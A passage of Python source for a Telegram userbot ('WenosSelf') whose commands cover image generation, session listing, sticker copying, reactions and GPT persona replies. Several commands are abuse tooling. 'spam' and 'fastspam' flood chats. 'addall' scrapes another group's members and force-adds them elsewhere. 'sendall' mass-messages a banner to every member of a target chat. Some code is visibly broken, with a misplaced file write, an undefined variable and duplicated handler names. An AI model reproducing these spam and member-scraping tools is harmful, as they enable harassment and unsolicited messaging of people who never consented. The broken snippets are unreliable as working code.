        return await message.reply_text("ᴘʟᴢ ɢɪᴠᴇ ᴍᴇ ᴛᴇxᴛ ᴛᴏ ᴡʀɪᴛᴇ ғɪʀsᴛ ")
    name = (
        message.text.split(None, 1)[1]
        if len(message.command) < 3
        else message.text.split(None, 1)[1].replace(" ", "%20")
    )
    hand = "https://apis.xditya.me/write?text=" + name
    await app.send_photo(message.chat.id, hand,caption="**WenosSelf ✨**", reply_to_message_id=message.id
                )
                
@app.on_message(filters.command(["uns"], ".") & filters.me)
async def write1(_, message):
    if len(message.command) < 2:
        return await message.reply_text("ᴘʟᴢ ɢɪᴠᴇ ᴍᴇ ᴛᴇxᴛ ᴛᴏ ᴡʀɪᴛᴇ ғɪʀsᴛ ")
    name = (
        message.text.split(None, 1)[1]
        if len(message.command) < 3
        else message.text.split(None, 1)[1].replace(" ", "%20")
    )
    hand = "https://source.unsplash.com/1600x900/?keyword=" + name
    await app.send_photo(message.chat.id, hand,caption="**WenosSelf ✨**", reply_to_message_id=message.id
                )

@app.on_message(filters.command(["bish"], ".") & filters.me)
async def write2(_, message):
    if len(message.command) < 2:
        return await message.reply_text("ᴘʟᴢ ɢɪᴠᴇ ᴍᴇ ᴛᴇxᴛ ᴛᴏ ᴡʀɪᴛᴇ ғɪʀsᴛ ")
    name = (
        message.text.split(None, 1)[1]
        if len(message.command) < 3
        else message.text.split(None, 1)[1].replace(" ", "%20")
    )
    hand = "https://some-random-api.com/canvas/misc/nobitches?no=" + name
    await app.send_photo(message.chat.id, hand,caption="**WenosSelf ✨**", reply_to_message_id=message.id
                )
                
@app.on_message(filters.command(["o"], ".") & filters.me)
async def write2(_, message):
    if len(message.command) < 2:
        return await message.reply_text("ᴘʟᴢ ɢɪᴠᴇ ᴍᴇ ᴛᴇxᴛ ᴛᴏ ᴡʀɪᴛᴇ ғɪʀsᴛ ")
    name = (
        message.text.split(None, 1)[1]
        if len(message.command) < 3
        else message.text.split(None, 1)[1].replace(" ", "%20")
    )
    hand = "https://some-random-api.com/canvas/misc/oogway?quote=" + name
    await app.send_photo(message.chat.id, hand,caption="**WenosSelf ✨**", reply_to_message_id=message.id
                )
                
@app.on_message(filters.command(["o2"], ".") & filters.me)
async def write2(_, message):
    if len(message.command) < 2:
        return await message.reply_text("ᴘʟᴢ ɢɪᴠᴇ ᴍᴇ ᴛᴇxᴛ ᴛᴏ ᴡʀɪᴛᴇ ғɪʀsᴛ ")
    name = (
        message.text.split(None, 1)[1]
        if len(message.command) < 3
        else message.text.split(None, 1)[1].replace(" ", "%20")
    )
    hand = "https://some-random-api.com/canvas/misc/oogway2?quote=" + name
    await app.send_photo(message.chat.id, hand,caption="**WenosSelf ✨**", reply_to_message_id=message.id
                )

@app.on_message(filters.command(["robo"], ".") & filters.me)
async def write2(_, message):
    if len(message.command) < 2:
        return await message.reply_text("ᴘʟᴢ ɢɪᴠᴇ ᴍᴇ ᴛᴇxᴛ ᴛᴏ ᴡʀɪᴛᴇ ғɪʀsᴛ ")
    name = (
        message.text.split(None, 1)[1]
        if len(message.command) < 3
        else message.text.split(None, 1)[1].replace(" ", "%20")
    )
    hand = "https://robohash.org/onerobot.png/" + name
    await app.send_photo(message.chat.id, hand,caption="**WenosSelf ✨**", reply_to_message_id=message.id
                )
#%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
def get_text(message: Message) -> Union[str, None]:
    """Extract Text From Commands"""
    if message.text is None:
        return
    if " " not in message.text:
        return
    try:
        return message.text.split(None, 1)[1]
    except IndexError:
        pass
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["ping", "پینگ"], ".") & filters.me)
async def ping(_, message: Message):
    start = perf_counter()
    await message.edit("<b>Pong!</b>")
    end = perf_counter()
    await message.edit(f"<b>Pong! {round(end - start, 3)}s</b>")
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["session", "سشن"], ".") & filters.me)
async def sessions_list(app, message: Message):
    formatted_sessions = []
    sessions = (await app.invoke(GetAuthorizations())).authorizations
    for num, session in enumerate(sessions, 1):
        formatted_sessions.append(
            (
                "<b>{num}</b>. <b>{model}</b> on <code>{platform}</code>\n"
                "<b>Hash:</b> {hash}\n"
                "<b>App name:</b> <code>{app_name}</code> v.{version}\n"
                "<b>Created (last activity):</b> {created} ({last_activity})\n"
                "<b>IP and location: </b>: <code>{ip}</code> (<i>{location}</i>)\n"
                "<b>Official status:</b> <code>{official}</code>\n"
                "<b>2FA accepted:</b> <code>{password_pending}</code>\n"
                "<b>Can accept calls / secret chats:</b> {calls} / {secret_chats}"
            ).format(
                num=num,
                model=escape(session.device_model),
                platform=escape(
                    session.platform
                    if session.platform != ""
                    else "unknown platform"
                ),
                hash=session.hash,
                app_name=escape(session.app_name),
                version=escape(
                    session.app_version
                    if session.app_version != ""
                    else "unknown"
                ),
                created=datetime.fromtimestamp(
                    session.date_created
                ).isoformat(),
                last_activity=datetime.fromtimestamp(
                    session.date_active
                ).isoformat(),
                ip=session.ip,
                location=session.country,
                official="✅" if session.official_app else "❌️",
                password_pending="❌️️" if session.password_pending else "✅",
                calls="❌️️" if session.call_requests_disabled else "✅",
                secret_chats="❌️️"
                if session.encrypted_requests_disabled
                else "✅",
            )
        )
    answer = "<b>Active sessions at your account:</b>\n\n"
    chunk = []
    for s in formatted_sessions:
        chunk.append(s)
        if len(chunk) == 5:
            answer += "\n\n".join(chunk)
            await message.reply(answer)
            answer = ""
            chunk.clear()
    if len(chunk):
        await message.reply("\n\n".join(chunk))
    await message.delete()
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(
    filters.command(["spam", "statspam", "slowspam"], ".") & filters.me
)
async def spam(app, message: Message):
    amount = int(message.command[1])
    text = " ".join(message.command[2:])
    spam_type = message.command[0]

    await message.delete()

    for msg in range(amount):
        if message.reply_to_message:
            sent = await message.reply_to_message.reply(text)
        else:
            sent = await app.send_message(message.chat.id, text)

        if spam_type == "statspam":
            await asyncio.sleep(0.1)
            await sent.delete()
        elif spam_type == "spam":
            await asyncio.sleep(0.1)
        elif spam_type == "slowspam":
            await asyncio.sleep(0.9)
@app.on_message(filters.command("fastspam", ".") & filters.me)
async def fastspam(app, message: Message):
    amount = int(message.command[1])
    text = " ".join(message.command[2:])

    await message.delete()

    coros = []
    for msg in range(amount):
        if message.reply_to_message:
            coros.append(message.reply_to_message.reply(text))
        else:
            coros.append(app.send_message(message.chat.id, text))
    await asyncio.wait(coros)

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["score", "cricket"], ".") & filters.me)
async def score(_, message: Message):
    score_page = "http://static.cricinfo.com/rss/livescores.xml"
    async with aiohttp.ClientSession() as session:
        async with session.get(score_page) as resp:
            page = await resp.text()
    soup = BeautifulSoup(page, "html.parser")
    result = soup.find_all("description")
    sed = "".join(match.get_text() + "\n\n" for match in result)
    await app.send_message(message.chat.id,
        f"**Cricket Live**▬▬▬▬▬\n<b>Match information:</b><u> Credits Friday team</u>\n\n\n<code>{sed}</code>\n▬▬▬▬▬**Cricket Live**"
    , reply_to_message_id=message.id)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(
    filters.command(["add"], ".") & filters.me)
async def inviteee(app, message: Message):
    mg = await message.reply_text("`Adding Users!`")
    user_s_to_add = message.text.split(" ", 1)[1]
    if not user_s_to_add:
        await mg.edit("`Give Me Users To Add! Check Help Menu For More Info!`")
        return
    user_list = user_s_to_add.split(" ")
    try:
        await app.add_chat_members(message.chat.id, user_list, forward_limit=100)
    except BaseException as e:
        await mg.edit(f"`Unable To Add Users! \nTraceBack : {e}`")
        return
    await mg.edit(f"`Sucessfully Added {len(user_list)} To This Group / Channel!`")

@app.on_message(
    filters.command(["addall"], ".") & filters.me)
async def inv(app, message: Message):
    ex = await message.reply_text("`Processing . . .`")
    text = message.text.split(" ", 1)
    queryy = text[1]
    chat = await app.get_chat(queryy)
    tgchat = message.chat
    await ex.edit_text(f"inviting users from {chat.username}")
    async for member in app.get_chat_members(chat.id):
        user = member.user
        zxb = [
            UserStatus.ONLINE,
            UserStatus.OFFLINE,
            UserStatus.RECENTLY,
            UserStatus.LAST_WEEK,
        ]
        if user.status in zxb:
            try:
                await app.add_chat_members(tgchat.id, user.id)
            except FloodWait as e:
                return
            except Exception as e:
                pass
            
@app.on_message(
    filters.command(["sendall"], ".") & filters.me)
async def inv(app, message: Message):
    ex = await message.reply_text("`Processing . . .`")
    text = message.text.split(" ", 1)
    queryy = text[1]
    chat = await app.get_chat(queryy)
    tgchat = message.chat
    await ex.edit_text(f"sending your banner to users in {chat.username}")
    async for member in app.get_chat_members(chat.id):
        user = member.user
        zxb = [
            UserStatus.ONLINE,
            UserStatus.OFFLINE,
            UserStatus.RECENTLY,
            UserStatus.LAST_WEEK,
        ]
        if user.status in zxb:
            try:
                sleep(5)
                await app.send_message(user.id , read("bannersender.txt"))
            except FloodWait as e:
                return
            except Exception as e:
                pass

@app.on_message(filters.command("invitelink", ".") & filters.me)
async def invite_link(app, message: Message):
    um = await message.edit_text("`Processing...`")
    if message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
        message.chat.title
        try:
            link = await app.export_chat_invite_link(message.chat.id)
            await um.edit(f"**Link Invite:** {link}")
        except Exception:
            await um.edit("Denied permission")
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(
    filters.command(["join"], ".") & filters.me)
async def join(app, message: Message):
    tex = message.command[1] if len(message.command) > 1 else message.chat.id
    g = await message.reply_text("`Processing...`")
    try:
        await app.join_chat(tex)
        await g.edit(f"**Successfully Joined Chat ID** `{tex}`")
    except Exception as ex:
        await g.edit(f"**ERROR:** \n\n{str(ex)}")


@app.on_message(
    filters.command(["leave"], ".") & filters.me)
async def leave(app, message: Message):
    xd = message.command[1] if len(message.command) > 1 else message.chat.id
    xv = await message.reply_text("`Processing...`")
    try:
        await xv.edit_text(f"{app.me.first_name} has left this group, bye!!")
        await app.leave_chat(xd)
    except Exception as ex:
        await xv.edit_text(f"**ERROR:** \n\n{str(ex)}")


@app.on_message(
    filters.command(["leaveallgc"], ".") & filters.me)
async def kickmeall(app, message: Message):
    tex = await message.reply_text("`Global Leave from group chats...`")
    er = 0
    done = 0
    async for dialog in app.get_dialogs():
        if dialog.chat.type in (enums.ChatType.GROUP, enums.ChatType.SUPERGROUP):
            chat = dialog.chat.id
            try:
                done += 1
                await app.leave_chat(chat)
            except BaseException:
                er += 1
    await tex.edit(
        f"**Successfully left {done} Groups, Failed to left {er} Groups**"
    )


@app.on_message(filters.command(["leaveallch"], ".") & filters.me)
async def kickmeallch(app, message: Message):
    ok = await message.reply_text("`Global Leave from group chats...`")
    er = 0
    done = 0
    async for dialog in app.get_dialogs():
        if dialog.chat.type in (enums.ChatType.CHANNEL):
            chat = dialog.chat.id
            try:
                done += 1
                await app.leave_chat(chat)
            except BaseException:
                er += 1
    await ok.edit(
        f"**Successfully left {done} Channel, failed to left {er} Channel**"
    )
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command("tiny", ".") & filters.me)
async def tinying(app, message: Message):
    reply = message.reply_to_message
    if not (reply and (reply.media)):
        return await message.edit_text("**Please Reply To Sticker Message!**")
    tex = await message.edit_text("`Processing . . .`")
    ik = await app.download_media(reply)
    im1 = Image.open("cache/blank.png")
    if ik.endswith(".tgs"):
        await app.download_media(reply, "man.tgs")
        await bash("lottie_convert.py man.tgs json.json")
        json = open("json.json", "r")
        jsn = json.read()
        jsn = jsn.replace("512", "2000")
        ("json.json", "w").write(jsn)
        await bash("lottie_convert.py json.json man.tgs")
        file = "man.tgs"
        os.remove("json.json")
    elif ik.endswith((".gif", ".mp4")):
        iik = cv2.VideoCapture(ik)
        busy = iik.read()
        cv2.imwrite("i.png", busy)
        fil = "i.png"
        im = Image.open(fil)
        z, d = im.size
        if z == d:
            xxx, yyy = 200, 200
        else:
            t = z + d
            a = z / t
            b = d / t
            aa = (a * 100) - 50
            bb = (b * 100) - 50
            xxx = 200 + 5 * aa
            yyy = 200 + 5 * bb
        k = im.resize((int(xxx), int(yyy)))
        k.save("k.png", format="PNG", optimize=True)
        im2 = Image.open("k.png")
        back_im = im1.copy()
        back_im.paste(im2, (150, 0))
        back_im.save("o.webp", "WEBP", quality=95)
        file = "o.webp"
        os.remove(fil)
        os.remove("k.png")
    else:
        im = Image.open(ik)
        z, d = im.size
        if z == d:
            xxx, yyy = 200, 200
        else:
            t = z + d
            a = z / t
            b = d / t
            aa = (a * 100) - 50
            bb = (b * 100) - 50
            xxx = 200 + 5 * aa
            yyy = 200 + 5 * bb
        k = im.resize((int(xxx), int(yyy)))
        k.save("k.png", format="PNG", optimize=True)
        im2 = Image.open("k.png")
        back_im = im1.copy()
        back_im.paste(im2, (150, 0))
        back_im.save("o.webp", "WEBP", quality=95)
        file = "o.webp"
        os.remove("k.png")
    await asyncio.gather(
        tex.delete(),
        app.send_sticker(
            message.chat.id,
            sticker=file,
            reply_to_message_id=ReplyCheck(message),
        ),
    )
    os.remove(file)
    os.remove(ik)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["packinfo", "stickerinfo"], ".") & filters.me)
async def packinfo(app, message: Message):
    rep = await message.edit_text("`Processing...`")
    if not message.reply_to_message:
        await rep.edit("Please Reply To Sticker...")
        return
    if not message.reply_to_message.sticker:
        await rep.edit("Please Reply To A Sticker...")
        return
    if not message.reply_to_message.sticker.set_name:
        await rep.edit("`Seems Like A Stray Sticker!`")
        return
    stickerset = await app.invoke(
        GetStickerSet(
            stickerset=InputStickerSetShortName(
                short_name=message.reply_to_message.sticker.set_name
            ),
            hash=0,
        )
    )
    emojis = []
    for stucker in stickerset.packs:
        if stucker.emoticon not in emojis:
            emojis.append(stucker.emoticon)
    output = f"""**Sticker Pack Title **: `{stickerset.set.title}`
**Sticker Pack Short Name **: `{stickerset.set.short_name}`
**Stickers Count **: `{stickerset.set.count}`
**Archived **: `{stickerset.set.archived}`
**Official **: `{stickerset.set.official}`
**Masks **: `{stickerset.set.masks}`
**Animated **: `{stickerset.set.animated}`
**Emojis In Pack **: `{' '.join(emojis)}`
"""
    await rep.edit(output)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
async def add_text_img(image_path, text):
    font_size = 12
    stroke_width = 1

    if ";" in text:
        upper_text, lower_text = text.split(";")
    else:
        upper_text = text
        lower_text = ""

    img = Image.open(image_path).convert("RGBA")
    img_info = img.info
    image_width, image_height = img.size
    font = ImageFont.truetype(
        font="cache/default.ttf",
        size=int(image_height * font_size) // 100,
    )
    draw = ImageDraw.Draw(img)

    char_width, char_height = font.getsize("A")
    chars_per_line = image_width // char_width
    top_lines = textwrap.wrap(upper_text, width=chars_per_line)
    bottom_lines = textwrap.wrap(lower_text, width=chars_per_line)

    if top_lines:
        y = 10
        for line in top_lines:
            line_width, line_height = font.getsize(line)
            x = (image_width - line_width) / 2
            draw.text(
                (x, y),
                line,
                fill="white",
                font=font,
                stroke_width=stroke_width,
                stroke_fill="black",
            )
            y += line_height

    if bottom_lines:
        y = image_height - char_height * len(bottom_lines) - 15
        for line in bottom_lines:
            line_width, line_height = font.getsize(line)
            x = (image_width - line_width) / 2
            draw.text(
                (x, y),
                line,
                fill="white",
                font=font,
                stroke_width=stroke_width,
                stroke_fill="black",
            )
            y += line_height

    final_image = os.path.join("memify.webp")
    img.save(final_image, **img_info)
    return final_image


# https://github.com/TeamUltroid/pyUltroid/blob/31c271cf4d35ab700e5880e952e54c82046812c2/pyUltroid/functions/helper.py#L154


async def bash(cmd):
    process = await asyncio.create_subprocess_shell(
        cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await process.communicate()
    err = stderr.decode().strip()
    out = stdout.decode().strip()
    return out, err


async def resize_media(media: str, video: bool, fast_forward: bool) -> str:
    if video:
        info_ = Media_Info.data(media)
        width = info_["pixel_sizes"][0]
        height = info_["pixel_sizes"][1]
        sec = info_["duration_in_ms"]
        s = round(float(sec)) / 1000

        if height == width:
            height, width = 512, 512
        elif height > width:
            height, width = 512, -1
        elif width > height:
            height, width = -1, 512

        resized_video = f"{media}.webm"
        if fast_forward:
            if s > 3:
                fract_ = 3 / s
                ff_f = round(fract_, 2)
                set_pts_ = ff_f - 0.01 if ff_f > fract_ else ff_f
                cmd_f = f"-filter:v 'setpts={set_pts_}*PTS',scale={width}:{height}"
            else:
                cmd_f = f"-filter:v scale={width}:{height}"
        else:
            cmd_f = f"-filter:v scale={width}:{height}"
        fps_ = float(info_["frame_rate"])
        fps_cmd = "-r 30 " if fps_ > 30 else ""
        cmd = f"ffmpeg -i {media} {cmd_f} -ss 00:00:00 -to 00:00:03 -an -c:v libvpx-vp9 {fps_cmd}-fs 256K {resized_video}"
        _, error, __, ___ = await run_cmd(cmd)
        os.remove(media)
        return resized_video

    image = Image.open(media)
    maxsize = 512
    scale = maxsize / max(image.width, image.height)
    new_size = (int(image.width * scale), int(image.height * scale))

    image = image.resize(new_size, Image.LANCZOS)
    resized_photo = "sticker.png"
    image.save(resized_photo)
    os.remove(media)
    return resized_photo

def get_text(message: Message) -> [None, str]:
    """Extract Text From Commands"""
    text_to_return = message.text
    if message.text is None:
        return None
    if " " in text_to_return:
        try:
            return message.text.split(None, 1)[1]
        except IndexError:
            return None
    else:
        return None

def get_arg(message: Message):
    msg = message.text
    msg = msg.replace(" ", "", 1) if msg[1] == " " else msg
    split = msg[1:].replace("\n", " \n").split(" ")
    if " ".join(split[1:]).strip() == "":
        return ""
    return " ".join(split[1:])

@app.on_message(filters.command(["tikel", "kang", "steal"], ".") & filters.me)
async def kang(app, message: Message):
    user = app.me
    replied = message.reply_to_message
    um = await message.edit_text("`Trying to kang...`")
    media_ = None
    emoji_ = None
    is_anim = False
    is_video = False
    resize = False
    ff_vid = False
    if replied and replied.media:
        if replied.photo:
            resize = True
        elif replied.document and "image" in replied.document.mime_type:
            resize = True
            replied.document.file_name
        elif replied.document and "tgsticker" in replied.document.mime_type:
            is_anim = True
            replied.document.file_name
        elif replied.document and "video" in replied.document.mime_type:
            resize = True
            is_video = True
            ff_vid = True
        elif replied.animation:
            resize = True
            is_video = True
            ff_vid = True
        elif replied.video:
            resize = True
            is_video = True
            ff_vid = True
        elif replied.sticker:
            if not replied.sticker.file_name:
                await um.edit("**The sticker has no Name!**")
                return
            emoji_ = replied.sticker.emoji
            is_anim = replied.sticker.is_animated
            is_video = replied.sticker.is_video
            if not (
                replied.sticker.file_name.endswith(".tgs")
                or replied.sticker.file_name.endswith(".webm")
            ):
                resize = True
                ff_vid = True
        else:
            await um.edit("**Unsupported Files**")
            return
        media_ = await app.download_media(replied, file_name="/downloads")
    else:
        await um.edit("**Please Reply to Photo/GIF/Sticker Media!**")
        return
    if media_:
        args = get_arg(message)
        pack = 1
        if len(args) == 2:
            emoji_, pack = args
        elif len(args) == 1:
            if args[0].isnumeric():
                pack = int(args[0])
            else:
                emoji_ = args[0]

        if emoji_ and emoji_ not in (
            getattr(emoji, _) for _ in dir(emoji) if not _.startswith("_")
        ):
            emoji_ = None
        if not emoji_:
            emoji_ = "✨"

        u_name = user.username
        u_name = "@" + u_name if u_name else user.first_name or user.id
        packname = f"Sticker_u{user.id}_v{pack}"
        custom_packnick = f"{u_name} Sticker Pack"
        packnick = f"{custom_packnick} Vol.{pack}"
        cmd = "/newpack"
        if resize:
            media_ = await resize_media(media_, is_video, ff_vid)
        if is_anim:
            packname += "_animated"
            packnick += " (Animated)"
            cmd = "/newanimated"
        if is_video:
            packname += "_video"
            packnick += " (Video)"
            cmd = "/newvideo"
        exist = False
        while True:
            try:
                exist = await app.invoke(
                    GetStickerSet(
                        stickerset=InputStickerSetShortName(short_name=packname), hash=0
                    )
                )
            except StickersetInvalid:
                exist = False
                break
            limit = 50 if (is_video or is_anim) else 120
            if exist.set.count >= limit:
                pack += 1
                packname = f"a{user.id}_by_userge_{pack}"
                packnick = f"{custom_packnick} Vol.{pack}"
                if is_anim:
                    packname += f"_anim{pack}"
                    packnick += f" (Animated){pack}"
                if is_video:
                    packname += f"_video{pack}"
                    packnick += f" (Video){pack}"
                await um.edit(
                    f"`Create a New Sticker Pack {pack} Because the Sticker Pack Is Full`"
                )
                continue
            break
        if exist is not False:
            try:
                await app.send_message("stickers", "/addsticker")
            except YouBlockedUser:
                await app.unblock_user("stickers")
                await app.send_message("stickers", "/addsticker")
            except Exception as e:
                return await Man.edit(f"**ERROR:** `{e}`")
            await asyncio.sleep(2)
            await app.send_message("stickers", packname)
            await asyncio.sleep(2)
            limit = "50" if is_anim else "120"
            while limit in await get_response(message, app):
                pack += 1
                packname = f"a{user.id}_by_{user.username}_{pack}"
                packnick = f"{custom_packnick} vol.{pack}"
                if is_anim:
                    packname += "_anim"
                    packnick += " (Animated)"
                if is_video:
                    packname += "_video"
                    packnick += " (Video)"
                await um.edit(
                    "`Create a New Sticker Pack "
                    + str(pack)
                    + " Because the sticker pack is full`"
                )
                await app.send_message("stickers", packname)
                await asyncio.sleep(2)
                if await get_response(message, app) == "Invalid pack selected.":
                    await app.send_message("stickers", cmd)
                    await asyncio.sleep(2)
                    await app.send_message("stickers", packnick)
                    await asyncio.sleep(2)
                    await app.send_document("stickers", media_)
                    await asyncio.sleep(2)
                    await app.send_message("Stickers", emoji_)
                    await asyncio.sleep(2)
                    await app.send_message("Stickers", "/publish")
                    await asyncio.sleep(2)
                    if is_anim:
                        await app.send_message(
                            "Stickers", f"<{packnick}>", parse_mode=ParseMode.MARKDOWN
                        )
                        await asyncio.sleep(2)
                    await app.send_message("Stickers", "/skip")
                    await asyncio.sleep(2)
                    await app.send_message("Stickers", packname)
                    await asyncio.sleep(2)
                    await um.edit(
                        f"**Sticker Added Successfully!**\n         🔥 **[CLICK HERE](https://t.me/addstickers/{packname})** 🔥\n**To Use Stickers**"
                    )
                    return
            await app.send_document("stickers", media_)
            await asyncio.sleep(2)
            if (
                await get_response(message, app)
                == "Sorry, the file type is invalid."
            ):
                await um.edit(
                    "**Failed to Add Sticker, Use @Stickers Bot To Add Your Sticker.**"
                )
                return
            await app.send_message("Stickers", emoji_)
            await asyncio.sleep(2)
            await app.send_message("Stickers", "/done")
        else:
            await um.edit("`Create a New Sticker Pack`")
            try:
                await app.send_message("Stickers", cmd)
            except YouBlockedUser:
                await app.unblock_user("stickers")
                await app.send_message("stickers", "/addsticker")
            await asyncio.sleep(2)
            await app.send_message("Stickers", packnick)
            await asyncio.sleep(2)
            await app.send_document("stickers", media_)
            await asyncio.sleep(2)
            if (
                await get_response(message, app)
                == "Sorry, the file type is invalid."
            ):
                await um.edit(
                    "**Failed to Add Sticker, Use @Stickers Bot To Add Your Sticker.**"
                )
                return
            await app.send_message("Stickers", emoji_)
            await asyncio.sleep(2)
            await app.send_message("Stickers", "/publish")
            await asyncio.sleep(2)
            if is_anim:
                await app.send_message("Stickers", f"<{packnick}>")
                await asyncio.sleep(2)
            await app.send_message("Stickers", "/skip")
            await asyncio.sleep(2)
            await app.send_message("Stickers", packname)
            await asyncio.sleep(2)
        await um.edit(
            f"**Sticker Added Successfully!**\n         🔥 **[CLICK HERE](https://t.me/addstickers/{packname})** 🔥"
        )
        if os.path.exists(str(media_)):
            os.remove(media_)


async def get_response(message, app):
    return [x async for x in app.get_chat_history("Stickers", limit=1)][0].text
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
LOG_GROUP = None
log = []
@app.on_message(filters.command("tagalert on", ".") & filters.me)
async def set_no_log_p_m(app, message: Message):
    if LOG_GROUP != -100:
        if not message.chat.id in log:
            log.append(message.chat.id)
            await message.edit("**Tag alert Activated Successfully**")

@app.on_message(filters.command("tagalert off", ".") & filters.me)
async def set_no_log_p_m(app, message: Message):
        if message.chat.id in log:
            log.clear()
            await message.edit("**Tag alert DeActivated Successfully**")

@app.on_message(filters.group & filters.mentioned ,group=101)
async def log_tagged_messages(app, message: Message):
    if log:
        result = f"<b>📨 #TAGS #MESSAGE</b>\n<b> •User : </b>{message.from_user.mention}"
        result += f"\n<b> • Group : </b>{message.chat.title}"
        result += f"\n<b> • 👀 </b><a href = '{message.link}'>watch</a>"
        result += f"\n<b> • Message : </b><code>{message.text}</code>"
        await asyncio.sleep(0.5)
        await app.send_message(
        "me",
        result,
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True,
    )

#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
def put(data):
    with open('data.pickle', 'wb') as f:
        pickle.dump(data, f)

def get():
    try:
        with open('data.pickle', 'rb') as f:
            return pickle.load(f)
    except FileNotFoundError:
        return {}

jos={
    "react": [1621967579]
}
@app.on_message(filters.regex(f'^(.setreact)') & filters.me)
def reacts2(app, m:Message):
    write("emo.txt" , m.text.replace(".setreact",""))
    qtext = m.reply_to_message.chat.id
    if qtext in jos["react"]:
        m.reply("NOPE")
    else:
        jos["react"].append(int(qtext))
        put(jos)
        m.reply("**Added to Reaction List**")  
@app.on_message(filters.regex(f'^(.delreact)') & filters.me)
def reacts3(app, m:Message):
    qtext = m.reply_to_message.chat.id
    if qtext in jos["react"]:
        jos["react"].remove(int(qtext))
        put(jos)
        m.reply("**deleted from Reaction List**")
    else:
        m.reply("**User is not in Reacton list.**")
@app.on_message(filters.regex(f'^(.reactlist)') & filters.me)
def reacts4(app, m:Message):
    reactlist= jos["react"]
    emoj= read("emo.txt")
    m.reply(f"**Emoji** = [ {emoj} ]\n**List** =\n {reactlist}")
@app.on_message(group = 99)
async def reacts(app, m:Message):

    if m.chat.id in jos["react"] is not None :
        a = read("emo.txt")
        await m.react(a)
    else:
        pass
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
def send_message(text,chat_id,message):
    url = "https://api.safone.dev/chatgpt"
    headers = {"Content-Type": "application/json"}
    payload = {
        "message": text,
        "version": 4,
        "chat_mode": "assistant",
        "dialog_messages": "[{\"bot\":\"\",\"user\":\"\"}]"
    }
    
    response = requests.post(url, headers=headers, data=json.dumps(payload))
    if response.status_code == 200:
        data = response.json()
        result = data["choices"][0]['message']['content']
        msg = f"**{result}**"
        app.send_message(chat_id, msg,reply_to_message_id=message.id)
    else:
        print("Error sending message")
        
@app.on_message(filters.command(["gpt4", "assist"], ".") & filters.me)
def handle_message(app, message):
        text = message.text.split(None, 1)[1]
        send_message(text,message.chat.id,message)
#@@@@@@@@
def send_message1(text,chat_id,message):
    url = "https://api.safone.dev/chatgpt"
    headers = {"Content-Type": "application/json"}
    payload = {
        "message": text,
        "version": 4,
        "chat_mode": "elon_mask",
        "dialog_messages": "[{\"bot\":\"\",\"user\":\"\"}]"
    }
    
    response = requests.post(url, headers=headers, data=json.dumps(payload))
    if response.status_code == 200:
        data = response.json()
        result = data["choices"][0]['message']['content']
        msg = f"**{result}**"
        app.send_message(chat_id, msg,reply_to_message_id=message.id)
    else:
        print("Error sending message")
        
@app.on_message(filters.command(["elon", "elonmusk"], ".") & filters.me)
def handle_message1(app, message):
        text = message.text.split(None, 1)[1]
        send_message1(text,message.chat.id,message)
#@@@@@@@
def send_message2(text,chat_id,message):
    url = "https://api.safone.dev/chatgpt"
    headers = {"Content-Type": "application/json"}
    payload = {
        "message": text,
        "version": 4,
        "chat_mode": "lionel_messi",
        "dialog_messages": "[{\"bot\":\"\",\"user\":\"\"}]"
    }
    
    response = requests.post(url, headers=headers, data=json.dumps(payload))
    if response.status_code == 200:
        data = response.json()
        result = data["choices"][0]['message']['content']
        msg = f"**{result}**"
        app.send_message(chat_id, msg,reply_to_message_id=message.id)
    else:
        print("Error sending message")
        
@app.on_message(filters.command(["messi", "leo"], ".") & filters.me)
def handle_message1(app, message):
        text = message.text.split(None, 1)[1]
        send_message2(text,message.chat.id,message)
#@@@@@@@
def send_message3(text,chat_id,message):
    url = "https://api.safone.dev/chatgpt"
    headers = {"Content-Type": "application/json"}
    payload = {
        "message": text,
        "version": 4,
        "chat_mode": "ronaldo",
        "dialog_messages": "[{\"bot\":\"\",\"user\":\"\"}]"
    }
    
    response = requests.post(url, headers=headers, data=json.dumps(payload))
    if response.status_code == 200:
        data = response.json()
        result = data["choices"][0]['message']['content']
        msg = f"**{result}**"
        app.send_message(chat_id, msg,reply_to_message_id=message.id)
    else:
        print("Error sending message")
        
@app.on_message(filters.command(["ronaldo", "chris"], ".") & filters.me)
def handle_message1(app, message):
        text = message.text.split(None, 1)[1]
        send_message3(text,message.chat.id,message)
#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@app.on_message(filters.command(["trump", "donald"], ".") & filters.me)
async def trump_tweet(app, message: Message):
    text = message.text.split(None, 1)[1]
    if not text:
        await message.edit(f"**Trump :** ``What Should I Tweet For You ?``")
        return
    url = f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={text}"
    r = requests.get(url=url).json()
    tweet = r["message"]
    starkxd = f"**Trump Has Tweeted** {text}"
